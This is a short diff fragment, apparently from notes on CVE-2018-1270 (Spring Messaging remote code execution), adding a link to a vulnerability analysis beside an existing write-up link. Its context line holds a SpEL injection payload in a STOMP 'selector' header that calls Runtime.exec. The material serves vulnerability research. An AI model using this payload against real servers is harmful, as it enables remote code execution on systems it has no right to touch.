@@ -69,3 +69,6 @@ var header  = {"selector":"T(java.lang.Runtime).getRuntime().exec('wireshark')"}
 加了点自己实践的截图
 
 https://chybeta.github.io/2018/04/07/spring-messaging-Remote-Code-Execution-%E5%88%86%E6%9E%90-%E3%80%90CVE-2018-1270%E3%80%91/
+
+
+漏洞分析：http://blog.nsfocus.net/spring-messaging-analysis/
